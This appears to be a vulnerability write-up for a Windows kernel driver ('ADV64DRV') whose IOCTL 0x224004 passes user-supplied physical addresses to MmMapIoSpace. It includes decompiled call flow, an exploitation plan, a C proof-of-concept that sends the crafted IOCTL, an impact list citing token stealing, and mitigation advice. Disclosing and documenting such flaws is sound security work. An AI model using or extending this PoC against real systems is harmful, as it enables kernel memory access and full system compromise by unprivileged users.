# Windows Kernel Driver Exploitation - Vulnerable IOCTL and Physical Memory Mapping

## Vulnerability Summary

The vulnerable driver exposes an IOCTL handler function, which processes various IOCTL codes, including `0x224004`. This IOCTL path passes unchecked user input to `MmMapIoSpace`, a kernel function that maps physical memory into virtual address space.

### Function Call Flow:

Reverse engineered using Ghdira
```
entry()
 -> FUN_00011500(param_1)
     -> FUN_00011460(param_1, IRP)
         -> if IOCTL == 0x224004:
                -> FUN_00011040(device, IRP, user_buffer)
                    -> MmMapIoSpace(physical_addr, size, 0)
```

### Core Vulnerability

In `FUN_00011040`, user input is parsed and used to call `MmMapIoSpace()`:

```c
puVar2 = *(undefined8 **)(param_2 + 0x18);  // User input buffer
uVar1 = *(uint *)(puVar2 + 1);              // Size (user controlled)
...
puVar4 = MmMapIoSpace(PhysicalAddress, Size, 0);
```

There are insufficient validations on:

* The physical address to be mapped
* The size of the mapping

This allows arbitrary physical memory access from user-mode by crafting a malicious IRP input.

## Exploitation Plan

To exploit the vulnerability:

1. Open a handle to the device.
2. Send a crafted buffer with a physical address and size.
3. The driver maps the physical memory.
4. Use the mapped region to read/write kernel memory.

### PoC Code (C)

```c
#include <windows.h>
#include <stdio.h>

#define IOCTL_VULN 0x224004

int main() {
    HANDLE hDevice = CreateFileA("\\\\.\\ADV64DRV",
                                 GENERIC_READ | GENERIC_WRITE,
                                 0,
                                 NULL,
                                 OPEN_EXISTING,
                                 0,
                                 NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device: %lu\n", GetLastError());
        return 1;
    }

    struct {
        uint64_t phys_addr;
        uint32_t size;
        uint32_t padding;
    } input = {
        .phys_addr = 0x100000, // Physical address (e.g., 1MB)
        .size = 0x1000         // One page (safe size)
    };

    DWORD bytesReturned;
    BOOL result = DeviceIoControl(hDevice,
                                  IOCTL_VULN,
                                  &input,
                                  sizeof(input),
                                  NULL,
                                  0,
                                  &bytesReturned,
                                  NULL);

    if (result) {
        printf("[+] IOCTL sent successfully.\n");
    } else {
        printf("[-] IOCTL failed: %lu\n", GetLastError());
    }

    CloseHandle(hDevice);
    return 0;
}
```

## Impact

This vulnerability provides a powerful primitive that allows unprivileged users to:

* Read kernel memory
* Write to kernel memory
* Hijack control structures (e.g., token stealing)
* Fully compromise the system

## Mitigation

Drivers should:

* Never allow user-mode to specify physical addresses directly.
* Validate all IOCTL input strictly.
* Avoid using `MmMapIoSpace()` on user-controlled input.
